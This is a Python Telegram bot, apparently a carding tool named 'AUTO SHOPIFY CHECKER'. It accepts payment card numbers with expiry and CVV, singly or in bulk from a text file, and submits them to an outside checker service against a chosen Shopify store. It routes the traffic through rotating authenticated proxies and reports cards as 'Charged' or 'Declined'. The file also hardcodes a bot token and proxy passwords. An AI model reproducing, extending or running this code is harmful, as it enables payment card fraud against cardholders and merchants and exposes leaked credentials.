#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import os
import json
import time
import random
import html
import io
import traceback

import httpx
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ChatAction,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)
from telegram.constants import ParseMode

# === CONFIG & SETUP ===

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)
logging.getLogger("httpx").setLevel(logging.WARNING)

TELEGRAM_BOT_TOKEN = "7615802418:AAGKxCpVrDVGFbyd3aQi0_9G9CHGcJMCLEY"
BINLIST_API_URL = "https://lookup.binlist.net/"
CHECKER_API_URL = "https://sigmabro766.onrender.com/"

USER_SITES_FILE = "user_shopify_sites.json"
current_user_shopify_site = {}

COMMON_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/91.0.4472.124 Safari/537.36"
    )
}

RAW_PROXIES = [
    "38.154.227.167:5868:dmeigyzw:5ece3v7xz8d2",
    "198.23.239.134:6540:dmeigyzw:5ece3v7xz8d2",
    "207.244.217.165:6712:dmeigyzw:5ece3v7xz8d2",
    "107.172.163.27:6543:dmeigyzw:5ece3v7xz8d2",
    "216.10.27.159:6837:dmeigyzw:5ece3v7xz8d2",
    "142.147.128.93:6593:dmeigyzw:5ece3v7xz8d2",
    "64.64.118.149:6732:dmeigyzw:5ece3v7xz8d2",
    "136.0.207.84:6661:dmeigyzw:5ece3v7xz8d2",
    "206.41.172.74:6634:dmeigyzw:5ece3v7xz8d2",
    "104.239.105.125:6655:dmeigyzw:5ece3v7xz8d2",
]

FORMATTED_PROXY_LIST = [
    f"http://{p.split(':')[2]}:{p.split(':')[3]}@{p.split(':')[0]}:{p.split(':')[1]}"
    for p in RAW_PROXIES
]
STATIC_PROXIES = [
    "http://PP_2MX8KKO81J:soyjpcgu_country-us@ps-pro.porterproxies.com:31112",
    "http://In2nyCyUORV4KYeI:yXhbVJozQeBVVRnM@geo.g-w.info:10080",
]
PROXY_LIST = STATIC_PROXIES + FORMATTED_PROXY_LIST

# === PERSISTENCE ===

def load_user_sites():
    global current_user_shopify_site
    try:
        with open(USER_SITES_FILE, encoding="utf-8") as f:
            data = json.load(f)
        current_user_shopify_site = {int(k): v for k, v in data.items()}
    except Exception:
        current_user_shopify_site = {}

def save_user_sites():
    try:
        with open(USER_SITES_FILE, "w", encoding="utf-8") as f:
            json.dump(current_user_shopify_site, f, indent=2)
    except Exception as e:
        logger.error(f"Could not save user sites: {e}")

def get_site_for_user(user_id: int) -> str | None:
    return current_user_shopify_site.get(user_id)

def set_site_for_user(user_id: int, site_url: str):
    current_user_shopify_site[user_id] = site_url
    save_user_sites()

# === HELPERS ===

async def lookup_bin(bin6: str) -> dict:
    default = {
        "bin": bin6,
        "scheme": "N/A",
        "type": "N/A",
        "brand": "N/A",
        "bank_name": "N/A",
        "country_name": "N/A",
        "country_emoji": "🌐",
        "error": None,
        "proxy_used": "Direct",
    }
    if len(bin6) < 6:
        default["error"] = "Invalid BIN"
        return default

    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    mounts = {"all://": proxy} if proxy else None
    proxy_tag = proxy.split("@")[-1].split(":")[0] if proxy else "Direct"

    try:
        async with httpx.AsyncClient(headers=COMMON_HEADERS, mounts=mounts, timeout=15.0) as client:
            resp = await client.get(f"{BINLIST_API_URL}{bin6}")
            resp.raise_for_status()
            data = resp.json()
        return {
            **default,
            "scheme": (data.get("scheme") or "").upper(),
            "type": (data.get("type") or "").upper(),
            "brand": (data.get("brand") or "").upper(),
            "bank_name": data.get("bank", {}).get("name", "N/A"),
            "country_name": data.get("country", {}).get("name", "N/A"),
            "country_emoji": data.get("country", {}).get("emoji", "🌐"),
            "proxy_used": proxy_tag,
        }
    except Exception as e:
        logger.error(f"BIN lookup error [{proxy_tag}]: {e}")
        default["error"] = "Lookup failed"
        default["proxy_used"] = proxy_tag
        return default

def parse_checker_response(text: str) -> dict | None:
    idx1 = text.find("{")
    idx2 = text.rfind("}")
    if idx1 == -1 or idx2 == -1 or idx2 <= idx1:
        return None
    try:
        return json.loads(text[idx1 : idx2 + 1])
    except json.JSONDecodeError:
        logger.warning("Failed to parse checker response JSON")
        return None

# === COMMAND HANDLERS ===

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = html.escape(user.username or user.first_name)
    greeting = (
        f"<b>❖ AUTO SHOPIFY CHECKER ❖</b>\n"
        f"<i>Powered by @alanjocc</i>\n\n"
        f"Hello, {name}!\n"
        f"➤ Use the menu below to get started."
    )
    keyboard = [
        [
            InlineKeyboardButton("🔗 Set/Update Site", callback_data="site:prompt_add"),
            InlineKeyboardButton("📍 My Current Site", callback_data="site:show_current"),
        ],
        [InlineKeyboardButton("📖 View Commands", callback_data="nav:show_cmds")],
        [InlineKeyboardButton("🧑‍💻 Dev Contact", url="https://t.me/alanjocc")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.message.edit_text(greeting, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(greeting, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "<b>📖 AVAILABLE COMMANDS</b>\n"
        "────────────────────────\n"
        "<b>/start</b> - Main menu.\n"
        "<b>/cmds</b> - Show this list.\n"
        "<b>/add &lt;site_url&gt;</b> - Set Shopify site.\n"
        "<b>/my_site</b> - Show your site.\n"
        "<b>/chk &lt;CC|MM|YY|CVV&gt;</b> - Check a card.\n"
        "<b>/mchk</b> - Send a .txt file to start mass-check."
    )
    kb = [[InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")]]
    if update.callback_query:
        await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.HTML)

async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].startswith("http"):
        return await update.message.reply_text("⚠️ Use: /add https://your-site.myshopify.com", parse_mode=ParseMode.HTML)
    set_site_for_user(update.effective_user.id, context.args[0])
    await update.message.reply_text(f"✅ Set your Shopify site to:\n<code>{html.escape(context.args[0])}</code>", parse_mode=ParseMode.HTML)

async def my_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    site = get_site_for_user(update.effective_user.id)
    if not site:
        return await update.message.reply_text("✅ No site set yet. Use /add to set one.", parse_mode=ParseMode.HTML)
    await update.message.reply_text(f"📍 Your current site is:\n<code>{html.escape(site)}</code>", parse_mode=ParseMode.HTML)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    site = get_site_for_user(user_id)
    if not site:
        return await update.message.reply_text("⚠️ No site set. Use /add <site_url>", parse_mode=ParseMode.HTML)
    if not context.args or context.args[0].count("|") != 3:
        return await update.message.reply_text("⚠️ Invalid format. Use: /chk 1234567890123456|MM|YY|CVV", parse_mode=ParseMode.HTML)

    cc_string = context.args[0]
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    t0 = time.time()
    bin_task = asyncio.create_task(lookup_bin(cc_string[:6]))

    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    mounts = {"all://": proxy} if proxy else None
    proxy_tag = proxy.split("@")[-1].split(":")[0] if proxy else "Direct"

    try:
        async with httpx.AsyncClient(headers=COMMON_HEADERS, mounts=mounts, timeout=45.0) as client:
            resp = await client.get(CHECKER_API_URL, params={"site": site, "cc": cc_string})
            resp.raise_for_status()
            api = parse_checker_response(resp.text)
    except Exception as e:
        logger.error(f"CHK error: {traceback.format_exc()}")
        api = None

    bin_info = await bin_task
    dt = round(time.time() - t0, 2)

    if api:
        resp_txt = api.get("Response", "")
        if "DECLINED" in resp_txt.upper():
            emoji, status = "❌", "Declined"
        elif "Thank You" in resp_txt or "ORDER_PLACED" in resp_txt.upper():
            emoji, status = "💎", "Charged"
        else:
            emoji, status = "ℹ️", "Unknown"
    else:
        emoji, status, resp_txt = "❓", "Error", resp_txt if api else "No response"

    message = (
        f"<b>{emoji} {html.escape(status)}</b>\n"
        f"<b>Card:</b> <code>{html.escape(cc_string)}</code>\n"
        f"────────────────────────\n"
        f"<b>BIN:</b> {html.escape(bin_info.get('scheme'))}/{html.escape(bin_info.get('type'))}/{html.escape(bin_info.get('brand'))}\n"
        f"<b>Bank:</b> {html.escape(bin_info.get('bank_name'))}\n"
        f"<b>Country:</b> {bin_info.get('country_emoji')} {html.escape(bin_info.get('country_name'))}\n"
        f"────────────────────────\n"
        f"<i>Checked in {dt}s via {proxy_tag}</i>"
    )
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📤 Send me a .txt file (each line: CC|MM|YY|CVV) and I'll process it for you.",
        parse_mode=ParseMode.HTML,
    )

async def mass_file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc:
        return
    if not doc.file_name.endswith(".txt"):
        return await update.message.reply_text("⚠️ Please send a .txt file.", parse_mode=ParseMode.HTML)

    file = await context.bot.get_file(doc.file_id)
    data = await file.download_as_bytes()
    lines = data.decode("utf-8", errors="ignore").splitlines()
    site = get_site_for_user(update.effective_user.id)
    if not site:
        return await update.message.reply_text("⚠️ No site set. Use /add first.", parse_mode=ParseMode.HTML)

    await update.message.reply_text(f"🧮 Starting mass‑check: {len(lines)} cards...", parse_mode=ParseMode.HTML)
    results = []
    for idx, line in enumerate(lines, 1):
        cc = line.strip()
        if cc.count("|") != 3:
            results.append(f"{cc} -> ⚠️ Invalid")
            continue
        proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
        mounts = {"all://": proxy} if proxy else None
        try:
            async with httpx.AsyncClient(headers=COMMON_HEADERS, mounts=mounts, timeout=30) as client:
                resp = await client.get(CHECKER_API_URL, params={"site": site, "cc": cc})
                api = parse_checker_response(resp.text)
            status = api.get("Response", "") if api else "Error"
            results.append(f"{cc} -> {status}")
        except Exception as e:
            results.append(f"{cc} -> Error")
        if idx % 10 == 0:
            await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    buffer = io.BytesIO("\n".join(results).encode("utf-8"))
    buffer.name = f"shopify_results_{int(time.time())}.txt"
    await update.message.reply_document(document=buffer, caption="✨ Mass‑check complete", parse_mode=ParseMode.HTML)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "site:prompt_add":
        await query.message.reply_text("Send me the Shopify site URL (e.g., https://your.myshopify.com):", parse_mode=ParseMode.HTML)
    elif query.data == "site:show_current":
        site = get_site_for_user(query.from_user.id)
        msg = site or "No site set yet."
        await query.message.reply_text(f"📍 Your site: <code>{html.escape(msg)}</code>", parse_mode=ParseMode.HTML)
    elif query.data == "nav:show_cmds":
        await cmds_command(update, context)
    elif query.data == "nav:show_start":
        await start_command(update, context)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception while handling an update:", exc_info=context.error)
    if hasattr(update, "message") and update.message:
        await update.message.reply_text("🚨 An internal error occurred.", parse_mode=ParseMode.HTML)

# === MAIN ENTRY ===

def main():
    load_user_sites()
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_error_handler(error_handler)

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("cmds", cmds_command))
    app.add_handler(CommandHandler("add", add_command))
    app.add_handler(CommandHandler("my_site", my_site_command))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("mchk", mchk_command))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), mass_file_handler))
    app.add_handler(CallbackQueryHandler(button_callback))

    logger.info("Bot started, polling...")
    app.run_polling()

if __name__ == "__main__":
    main()
